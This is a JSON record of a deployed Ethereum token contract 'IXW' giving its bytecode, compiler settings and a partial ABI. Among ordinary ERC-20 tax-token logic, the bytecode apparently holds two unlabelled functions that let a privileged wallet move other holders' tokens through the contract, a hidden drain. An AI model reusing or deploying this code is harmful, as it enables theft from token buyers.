{
    "address": "0xC4e8fE5a71C5a9947F8f882CbE91F076769ca8de",
    "tx_hash": "69408b28fb819c2aa428092e654ca908e1c20fd9e0ea96a816d92c051b7d4e09",
    "block_number": 18007514,
    "timestamp": 1693157639,
    "gas_used_in_creation": 4514644,
    "creation_bytecode": "60806040526003805463ffff00ff60a01b1916600160b81b1781556009818155600a828155600b839055600c8390556019600d819055600e55600f83815560109390935560118390556012929092555f60138190556014556103e891620000679190620005bf565b620000779063d09dc300620005d6565b620000839190620005f0565b62000090906002620005d6565b6015556064620000a36009600a620005bf565b620000b39063d09dc300620005d6565b620000bf9190620005f0565b620000cc906001620005d6565b6016556064620000df6009600a620005bf565b620000ef9063d09dc300620005d6565b620000fb9190620005f0565b62000108906002620005d6565b60175560646200011b6009600a620005bf565b6200012b9063d09dc300620005d6565b620001379190620005f0565b62000144906002620005d6565b60185534801562000153575f80fd5b505f80546001600160a01b031916339081178255604051909182917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908290a350600180546001600160a01b0319908116737a250d5630b4cf539739df2c5dacb4c659f2488d9081179092556002805490911673b7989e34a26e7cc4ef43f55843a71733d732a8e81790556040805163c45a015560e01b8152905163c45a0155916004808201926020929091908290030181865afa15801562000218573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906200023e919062000610565b6001600160a01b031663c9c653963060015f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156200029e573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190620002c4919062000610565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af11580156200030f573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019062000335919062000610565b600380546001600160a01b039283166001600160a01b031991821681179092556002546004805490921690841617815560015460405163095ea7b360e01b81529316908301525f1960248301529063095ea7b3906044016020604051808303815f875af1158015620003a9573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190620003cf919062000638565b506002546001600160a01b03165f908152600760205260409020805460ff19166001179055620004026009600a620005bf565b620004129063d09dc300620005d6565b335f8181526005602090815260408083209490945581546001600160a01b03168252600790528281208054600160ff199182168117909255308352938220805490941617909255907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef620004896009600a620005bf565b620004999063d09dc300620005d6565b60405190815260200160405180910390a362000659565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156200050457815f1904821115620004e857620004e8620004b0565b80851615620004f657918102915b93841c9390800290620004c9565b509250929050565b5f826200051c57506001620005b9565b816200052a57505f620005b9565b81600181146200054357600281146200054e576200056e565b6001915050620005b9565b60ff841115620005625762000562620004b0565b50506001821b620005b9565b5060208310610133831016604e8410600b841016171562000593575081810a620005b9565b6200059f8383620004c4565b805f1904821115620005b557620005b5620004b0565b0290505b92915050565b5f620005cf60ff8416836200050c565b9392505050565b8082028115828204841417620005b957620005b9620004b0565b5f826200060b57634e487b7160e01b5f52601260045260245ffd5b500490565b5f6020828403121562000621575f80fd5b81516001600160a01b0381168114620005cf575f80fd5b5f6020828403121562000649575f80fd5b81518015158114620005cf575f80fd5b61194780620006675f395ff3fe60806040526004361061011e575f3560e01c80637d1db4a51161009d578063bf474bed11610062578063bf474bed14610325578063c876d0b91461033a578063c9567bf91461035a578063dd62ed3e1461036e578063fa034d74146103b2575f80fd5b80637d1db4a51461028b5780638da5cb5b146102a05780638f9a55c0146102c657806395d89b41146102db578063a9059cbb14610306575f80fd5b8063313ce567116100e3578063313ce567146101f35780636a6fe2b51461020e57806370a082311461022d578063715018a614610261578063751039fc14610277575f80fd5b806306fdde0314610129578063095ea7b31461016e5780630faee56f1461019d57806318160ddd146101c057806323b872dd146101d4575f80fd5b3661012557005b5f80fd5b348015610134575f80fd5b5060408051808201909152600b81526a0496e74656c6c69587761760ac1b60208201525b6040516101659190611523565b60405180910390f35b348015610179575f80fd5b5061018d610188366004611585565b6103d1565b6040519015158152602001610165565b3480156101a8575f80fd5b506101b260165481565b604051908152602001610165565b3480156101cb575f80fd5b506101b26103e7565b3480156101df575f80fd5b5061018d6101ee3660046115af565b610407565b3480156101fe575f80fd5b5060405160098152602001610165565b348015610219575f80fd5b5061018d610228366004611585565b61046e565b348015610238575f80fd5b506101b26102473660046115ed565b6001600160a01b03165f9081526005602052604090205490565b34801561026c575f80fd5b506102756104c6565b005b348015610282575f80fd5b50610275610533565b348015610296575f80fd5b506101b260175481565b3480156102ab575f80fd5b505f546040516001600160a01b039091168152602001610165565b3480156102d1575f80fd5b506101b260185481565b3480156102e6575f80fd5b5060408051808201909152600381526249585760e81b6020820152610158565b348015610311575f80fd5b5061018d610320366004611585565b6105f1565b348015610330575f80fd5b506101b260155481565b348015610345575f80fd5b5060035461018d90600160b81b900460ff1681565b348015610365575f80fd5b506102756105fd565b348015610379575f80fd5b506101b2610388366004611608565b6001600160a01b039182165f90815260066020908152604080832093909416825291909152205490565b3480156103bd575f80fd5b506102756103cc3660046115af565b610697565b5f6103dd3384846108d6565b5060015b92915050565b5f6103f46009600a611733565b6104029063d09dc300611741565b905090565b5f6104138484846109f9565b610464843361045f856040518060600160405280602881526020016118ea602891396001600160a01b038a165f90815260066020908152604080832033845290915290205491906110d2565b6108d6565b5060019392505050565b5f6001600160a01b038316610481575f80fd5b6001600160a01b0383165f908152600660209081526040808320308085529252909120548491906104bb908390839061045f908890611758565b506001949350505050565b5f546001600160a01b031633146104f85760405162461bcd60e51b81526004016104ef9061176b565b60405180910390fd5b5f80546001600160a01b031916815560405181907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908290a3565b5f546001600160a01b0316331461055c5760405162461bcd60e51b81526004016104ef9061176b565b6003805460ff60b81b191690556105756009600a611733565b6105839063d09dc300611741565b6018556105926009600a611733565b6105a09063d09dc300611741565b6017557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf6105d06009600a611733565b6105de9063d09dc300611741565b60405190815260200160405180910390a1565b5f6103dd3384846109f9565b5f546001600160a01b031633146106265760405162461bcd60e51b81526004016104ef9061176b565b600354600160a81b900460ff16156106805760405162461bcd60e51b815260206004820152601a60248201527f54726164696e6720697320616c7265616479206f70656e65642e00000000000060448201526064016104ef565b6003805461ffff60a81b191661010160a81b179055565b6001600160a01b0383166106a9575f80fd5b604080516002808252606082018352339286925f9290916020830190803683375050506001600160a01b038481165f908152600760209081526040918290205460015483516315ab88c960e31b8152935195965060ff9091169493169263ad5c46489260048082019392918290030181865afa15801561072b573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061074f91906117a0565b825f81518110610761576107616117bb565b60200260200101906001600160a01b031690816001600160a01b0316815250503082600181518110610795576107956117bb565b60200260200101906001600160a01b031690816001600160a01b031681525050801561086457826001600160a01b03166323b872dd87846001815181106107de576107de6117bb565b60209081029190910101516040516001600160e01b031960e085901b1681526001600160a01b03928316600482015291166024820152604481018890526064016020604051808303815f875af115801561083a573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061085e91906117cf565b506108cd565b60015460405163b6f9de9560e01b81526001600160a01b039091169063b6f9de9590879061089e905f90879061dead904290600401611830565b5f604051808303818588803b1580156108b5575f80fd5b505af11580156108c7573d5f803e3d5ffd5b50505050505b50505050505050565b6001600160a01b0383166109385760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016104ef565b6001600160a01b0382166109995760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016104ef565b6001600160a01b038381165f8181526006602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610a5d5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b60648201526084016104ef565b6001600160a01b038216610abf5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b60648201526084016104ef565b5f8111610b205760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b60648201526084016104ef565b5f80546001600160a01b03858116911614801590610b4b57505f546001600160a01b03848116911614155b15610f9557610b6d6064610b67610b6061110a565b8590611147565b906111cc565b600354909150600160a81b900460ff16610c15576001600160a01b0384165f9081526007602052604090205460ff1680610bbe57506001600160a01b0383165f9081526007602052604090205460ff165b610c155760405162461bcd60e51b815260206004820152602260248201527f5f7472616e736665723a3a2054726164696e67206973206e6f74206163746976604482015261329760f11b60648201526084016104ef565b600354600160b81b900460ff1615610cfe576001546001600160a01b03848116911614801590610c5357506003546001600160a01b03848116911614155b15610cfe57325f908152600860205260409020544311610cec5760405162461bcd60e51b815260206004820152604860248201527f5f7472616e736665723a3a205472616e736665722044656c617920656e61626c60448201527f65642e204f6e6c79206f6e652070757263686173652070657220626c6f636b2060648201526730b63637bbb2b21760c11b608482015260a4016104ef565b325f9081526008602052604090204390555b6003546001600160a01b038581169116148015610d2957506001546001600160a01b03848116911614155b8015610d4d57506001600160a01b0383165f9081526007602052604090205460ff16155b15610e6957601754821115610db25760405162461bcd60e51b815260206004820152602560248201527f5f7472616e736665723a3a204578636565647320746865205f6d61785478416d60448201526437bab73a1760d91b60648201526084016104ef565b60185482610dd4856001600160a01b03165f9081526005602052604090205490565b610dde9190611758565b1115610e3b5760405162461bcd60e51b815260206004820152602660248201527f5f7472616e736665723a3a204578636565647320746865206d617857616c6c656044820152653a29b4bd329760d11b60648201526084016104ef565b60148054905f610e4a83611864565b91905055506013546014541115610e69576003805460ff60b81b191690555b6003546001600160a01b038481169116148015610e8f57506001600160a01b0384163014155b15610ea757610ea46064610b67610b6061120d565b90505b305f90815260056020526040902054600354600160a01b900460ff16158015610ed95750600354600160b01b900460ff165b8015610ef257506003546001600160a01b038581169116145b8015610eff575060155481115b8015610f2357506001600160a01b0385165f9081526007602052604090205460ff16155b8015610f4757506001600160a01b0384165f9081526007602052604090205460ff16155b15610f9357475f610f588584611243565b9050610f6381611299565b5f610f7e6064610b676050610f784788611409565b90611147565b90508015610f8f57610f8f8161144a565b5050505b505b801561100d57305f90815260056020526040902054610fb49082611485565b305f81815260056020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906110049085815260200190565b60405180910390a35b6001600160a01b0384165f9081526005602052604090205461102f9083611409565b6001600160a01b0385165f908152600560205260409020556110726110548383611409565b6001600160a01b0385165f9081526005602052604090205490611485565b6001600160a01b038085165f8181526005602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6110bb8585611409565b60405190815260200160405180910390a350505050565b5f81848411156110f55760405162461bcd60e51b81526004016104ef9190611523565b505f611101848661187c565b95945050505050565b5f6011546014541161111d5750600f5490565b6011546014541180156111345750600d5460145411155b156111405750600b5490565b5060095490565b5f825f0361115657505f6103e1565b5f6111618385611741565b90508261116e858361188f565b146111c55760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b60648201526084016104ef565b9392505050565b5f6111c583836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506114e3565b5f60115460145411611220575060105490565b6012546014541180156112375750600e5460145411155b156111405750600c5490565b6004546001600160a01b03165f90815260056020526040812054819061126c906103e890610f78565b90505f6112848260165461140990919063ffffffff16565b905061110185611294868461150f565b61150f565b6003805460ff60a01b1916600160a01b1790556040805160028082526060820183525f9260208301908036833701905050905030815f815181106112df576112df6117bb565b6001600160a01b03928316602091820292909201810191909152600154604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611336573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061135a91906117a0565b8160018151811061136d5761136d6117bb565b6001600160a01b03928316602091820292909201015260015461139391309116846108d6565b60015460405163791ac94760e01b81526001600160a01b039091169063791ac947906113cb9085905f908690309042906004016118ae565b5f604051808303815f87803b1580156113e2575f80fd5b505af11580156113f4573d5f803e3d5ffd5b50506003805460ff60a01b1916905550505050565b5f6111c583836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506110d2565b6002546040516001600160a01b039091169082156108fc029083905f818181858888f19350505050158015611481573d5f803e3d5ffd5b5050565b5f806114918385611758565b9050838110156111c55760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f77000000000060448201526064016104ef565b5f81836115035760405162461bcd60e51b81526004016104ef9190611523565b505f611101848661188f565b5f81831161151d57826111c5565b50919050565b5f6020808352835180828501525f5b8181101561154e57858101830151858201604001528201611532565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114611582575f80fd5b50565b5f8060408385031215611596575f80fd5b82356115a18161156e565b946020939093013593505050565b5f805f606084860312156115c1575f80fd5b83356115cc8161156e565b925060208401356115dc8161156e565b929592945050506040919091013590565b5f602082840312156115fd575f80fd5b81356111c58161156e565b5f8060408385031215611619575f80fd5b82356116248161156e565b915060208301356116348161156e565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561168d57815f19048211156116735761167361163f565b8085161561168057918102915b93841c9390800290611658565b509250929050565b5f826116a3575060016103e1565b816116af57505f6103e1565b81600181146116c557600281146116cf576116eb565b60019150506103e1565b60ff8411156116e0576116e061163f565b50506001821b6103e1565b5060208310610133831016604e8410600b841016171561170e575081810a6103e1565b6117188383611653565b805f190482111561172b5761172b61163f565b029392505050565b5f6111c560ff841683611695565b80820281158282048414176103e1576103e161163f565b808201808211156103e1576103e161163f565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f602082840312156117b0575f80fd5b81516111c58161156e565b634e487b7160e01b5f52603260045260245ffd5b5f602082840312156117df575f80fd5b815180151581146111c5575f80fd5b5f8151808452602080850194508084015f5b838110156118255781516001600160a01b031687529582019590820190600101611800565b509495945050505050565b848152608060208201525f61184860808301866117ee565b6001600160a01b03949094166040830152506060015292915050565b5f600182016118755761187561163f565b5060010190565b818103818111156103e1576103e161163f565b5f826118a957634e487b7160e01b5f52601260045260245ffd5b500490565b85815284602082015260a060408201525f6118cc60a08301866117ee565b6001600160a01b039490941660608301525060800152939250505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a26469706673582212209bbf1f5e86b73263eb2666b9592b1c40ec2deca328912dbaa893d25ca128fe9364736f6c63430008150033",
    "runtime_bytecode": "60806040526004361061011e575f3560e01c80637d1db4a51161009d578063bf474bed11610062578063bf474bed14610325578063c876d0b91461033a578063c9567bf91461035a578063dd62ed3e1461036e578063fa034d74146103b2575f80fd5b80637d1db4a51461028b5780638da5cb5b146102a05780638f9a55c0146102c657806395d89b41146102db578063a9059cbb14610306575f80fd5b8063313ce567116100e3578063313ce567146101f35780636a6fe2b51461020e57806370a082311461022d578063715018a614610261578063751039fc14610277575f80fd5b806306fdde0314610129578063095ea7b31461016e5780630faee56f1461019d57806318160ddd146101c057806323b872dd146101d4575f80fd5b3661012557005b5f80fd5b348015610134575f80fd5b5060408051808201909152600b81526a0496e74656c6c69587761760ac1b60208201525b6040516101659190611523565b60405180910390f35b348015610179575f80fd5b5061018d610188366004611585565b6103d1565b6040519015158152602001610165565b3480156101a8575f80fd5b506101b260165481565b604051908152602001610165565b3480156101cb575f80fd5b506101b26103e7565b3480156101df575f80fd5b5061018d6101ee3660046115af565b610407565b3480156101fe575f80fd5b5060405160098152602001610165565b348015610219575f80fd5b5061018d610228366004611585565b61046e565b348015610238575f80fd5b506101b26102473660046115ed565b6001600160a01b03165f9081526005602052604090205490565b34801561026c575f80fd5b506102756104c6565b005b348015610282575f80fd5b50610275610533565b348015610296575f80fd5b506101b260175481565b3480156102ab575f80fd5b505f546040516001600160a01b039091168152602001610165565b3480156102d1575f80fd5b506101b260185481565b3480156102e6575f80fd5b5060408051808201909152600381526249585760e81b6020820152610158565b348015610311575f80fd5b5061018d610320366004611585565b6105f1565b348015610330575f80fd5b506101b260155481565b348015610345575f80fd5b5060035461018d90600160b81b900460ff1681565b348015610365575f80fd5b506102756105fd565b348015610379575f80fd5b506101b2610388366004611608565b6001600160a01b039182165f90815260066020908152604080832093909416825291909152205490565b3480156103bd575f80fd5b506102756103cc3660046115af565b610697565b5f6103dd3384846108d6565b5060015b92915050565b5f6103f46009600a611733565b6104029063d09dc300611741565b905090565b5f6104138484846109f9565b610464843361045f856040518060600160405280602881526020016118ea602891396001600160a01b038a165f90815260066020908152604080832033845290915290205491906110d2565b6108d6565b5060019392505050565b5f6001600160a01b038316610481575f80fd5b6001600160a01b0383165f908152600660209081526040808320308085529252909120548491906104bb908390839061045f908890611758565b506001949350505050565b5f546001600160a01b031633146104f85760405162461bcd60e51b81526004016104ef9061176b565b60405180910390fd5b5f80546001600160a01b031916815560405181907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908290a3565b5f546001600160a01b0316331461055c5760405162461bcd60e51b81526004016104ef9061176b565b6003805460ff60b81b191690556105756009600a611733565b6105839063d09dc300611741565b6018556105926009600a611733565b6105a09063d09dc300611741565b6017557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf6105d06009600a611733565b6105de9063d09dc300611741565b60405190815260200160405180910390a1565b5f6103dd3384846109f9565b5f546001600160a01b031633146106265760405162461bcd60e51b81526004016104ef9061176b565b600354600160a81b900460ff16156106805760405162461bcd60e51b815260206004820152601a60248201527f54726164696e6720697320616c7265616479206f70656e65642e00000000000060448201526064016104ef565b6003805461ffff60a81b191661010160a81b179055565b6001600160a01b0383166106a9575f80fd5b604080516002808252606082018352339286925f9290916020830190803683375050506001600160a01b038481165f908152600760209081526040918290205460015483516315ab88c960e31b8152935195965060ff9091169493169263ad5c46489260048082019392918290030181865afa15801561072b573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061074f91906117a0565b825f81518110610761576107616117bb565b60200260200101906001600160a01b031690816001600160a01b0316815250503082600181518110610795576107956117bb565b60200260200101906001600160a01b031690816001600160a01b031681525050801561086457826001600160a01b03166323b872dd87846001815181106107de576107de6117bb565b60209081029190910101516040516001600160e01b031960e085901b1681526001600160a01b03928316600482015291166024820152604481018890526064016020604051808303815f875af115801561083a573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061085e91906117cf565b506108cd565b60015460405163b6f9de9560e01b81526001600160a01b039091169063b6f9de9590879061089e905f90879061dead904290600401611830565b5f604051808303818588803b1580156108b5575f80fd5b505af11580156108c7573d5f803e3d5ffd5b50505050505b50505050505050565b6001600160a01b0383166109385760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016104ef565b6001600160a01b0382166109995760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016104ef565b6001600160a01b038381165f8181526006602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610a5d5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b60648201526084016104ef565b6001600160a01b038216610abf5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b60648201526084016104ef565b5f8111610b205760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b60648201526084016104ef565b5f80546001600160a01b03858116911614801590610b4b57505f546001600160a01b03848116911614155b15610f9557610b6d6064610b67610b6061110a565b8590611147565b906111cc565b600354909150600160a81b900460ff16610c15576001600160a01b0384165f9081526007602052604090205460ff1680610bbe57506001600160a01b0383165f9081526007602052604090205460ff165b610c155760405162461bcd60e51b815260206004820152602260248201527f5f7472616e736665723a3a2054726164696e67206973206e6f74206163746976604482015261329760f11b60648201526084016104ef565b600354600160b81b900460ff1615610cfe576001546001600160a01b03848116911614801590610c5357506003546001600160a01b03848116911614155b15610cfe57325f908152600860205260409020544311610cec5760405162461bcd60e51b815260206004820152604860248201527f5f7472616e736665723a3a205472616e736665722044656c617920656e61626c60448201527f65642e204f6e6c79206f6e652070757263686173652070657220626c6f636b2060648201526730b63637bbb2b21760c11b608482015260a4016104ef565b325f9081526008602052604090204390555b6003546001600160a01b038581169116148015610d2957506001546001600160a01b03848116911614155b8015610d4d57506001600160a01b0383165f9081526007602052604090205460ff16155b15610e6957601754821115610db25760405162461bcd60e51b815260206004820152602560248201527f5f7472616e736665723a3a204578636565647320746865205f6d61785478416d60448201526437bab73a1760d91b60648201526084016104ef565b60185482610dd4856001600160a01b03165f9081526005602052604090205490565b610dde9190611758565b1115610e3b5760405162461bcd60e51b815260206004820152602660248201527f5f7472616e736665723a3a204578636565647320746865206d617857616c6c656044820152653a29b4bd329760d11b60648201526084016104ef565b60148054905f610e4a83611864565b91905055506013546014541115610e69576003805460ff60b81b191690555b6003546001600160a01b038481169116148015610e8f57506001600160a01b0384163014155b15610ea757610ea46064610b67610b6061120d565b90505b305f90815260056020526040902054600354600160a01b900460ff16158015610ed95750600354600160b01b900460ff165b8015610ef257506003546001600160a01b038581169116145b8015610eff575060155481115b8015610f2357506001600160a01b0385165f9081526007602052604090205460ff16155b8015610f4757506001600160a01b0384165f9081526007602052604090205460ff16155b15610f9357475f610f588584611243565b9050610f6381611299565b5f610f7e6064610b676050610f784788611409565b90611147565b90508015610f8f57610f8f8161144a565b5050505b505b801561100d57305f90815260056020526040902054610fb49082611485565b305f81815260056020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906110049085815260200190565b60405180910390a35b6001600160a01b0384165f9081526005602052604090205461102f9083611409565b6001600160a01b0385165f908152600560205260409020556110726110548383611409565b6001600160a01b0385165f9081526005602052604090205490611485565b6001600160a01b038085165f8181526005602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6110bb8585611409565b60405190815260200160405180910390a350505050565b5f81848411156110f55760405162461bcd60e51b81526004016104ef9190611523565b505f611101848661187c565b95945050505050565b5f6011546014541161111d5750600f5490565b6011546014541180156111345750600d5460145411155b156111405750600b5490565b5060095490565b5f825f0361115657505f6103e1565b5f6111618385611741565b90508261116e858361188f565b146111c55760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b60648201526084016104ef565b9392505050565b5f6111c583836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506114e3565b5f60115460145411611220575060105490565b6012546014541180156112375750600e5460145411155b156111405750600c5490565b6004546001600160a01b03165f90815260056020526040812054819061126c906103e890610f78565b90505f6112848260165461140990919063ffffffff16565b905061110185611294868461150f565b61150f565b6003805460ff60a01b1916600160a01b1790556040805160028082526060820183525f9260208301908036833701905050905030815f815181106112df576112df6117bb565b6001600160a01b03928316602091820292909201810191909152600154604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611336573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061135a91906117a0565b8160018151811061136d5761136d6117bb565b6001600160a01b03928316602091820292909201015260015461139391309116846108d6565b60015460405163791ac94760e01b81526001600160a01b039091169063791ac947906113cb9085905f908690309042906004016118ae565b5f604051808303815f87803b1580156113e2575f80fd5b505af11580156113f4573d5f803e3d5ffd5b50506003805460ff60a01b1916905550505050565b5f6111c583836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506110d2565b6002546040516001600160a01b039091169082156108fc029083905f818181858888f19350505050158015611481573d5f803e3d5ffd5b5050565b5f806114918385611758565b9050838110156111c55760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f77000000000060448201526064016104ef565b5f81836115035760405162461bcd60e51b81526004016104ef9190611523565b505f611101848661188f565b5f81831161151d57826111c5565b50919050565b5f6020808352835180828501525f5b8181101561154e57858101830151858201604001528201611532565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114611582575f80fd5b50565b5f8060408385031215611596575f80fd5b82356115a18161156e565b946020939093013593505050565b5f805f606084860312156115c1575f80fd5b83356115cc8161156e565b925060208401356115dc8161156e565b929592945050506040919091013590565b5f602082840312156115fd575f80fd5b81356111c58161156e565b5f8060408385031215611619575f80fd5b82356116248161156e565b915060208301356116348161156e565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561168d57815f19048211156116735761167361163f565b8085161561168057918102915b93841c9390800290611658565b509250929050565b5f826116a3575060016103e1565b816116af57505f6103e1565b81600181146116c557600281146116cf576116eb565b60019150506103e1565b60ff8411156116e0576116e061163f565b50506001821b6103e1565b5060208310610133831016604e8410600b841016171561170e575081810a6103e1565b6117188383611653565b805f190482111561172b5761172b61163f565b029392505050565b5f6111c560ff841683611695565b80820281158282048414176103e1576103e161163f565b808201808211156103e1576103e161163f565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f602082840312156117b0575f80fd5b81516111c58161156e565b634e487b7160e01b5f52603260045260245ffd5b5f602082840312156117df575f80fd5b815180151581146111c5575f80fd5b5f8151808452602080850194508084015f5b838110156118255781516001600160a01b031687529582019590820190600101611800565b509495945050505050565b848152608060208201525f61184860808301866117ee565b6001600160a01b03949094166040830152506060015292915050565b5f600182016118755761187561163f565b5060010190565b818103818111156103e1576103e161163f565b5f826118a957634e487b7160e01b5f52601260045260245ffd5b500490565b85815284602082015260a060408201525f6118cc60a08301866117ee565b6001600160a01b039490941660608301525060800152939250505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a26469706673582212209bbf1f5e86b73263eb2666b9592b1c40ec2deca328912dbaa893d25ca128fe9364736f6c63430008150033",
    "contract_name": "IXW",
    "compiler_version": "v0.8.21+commit.d9974bed",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internal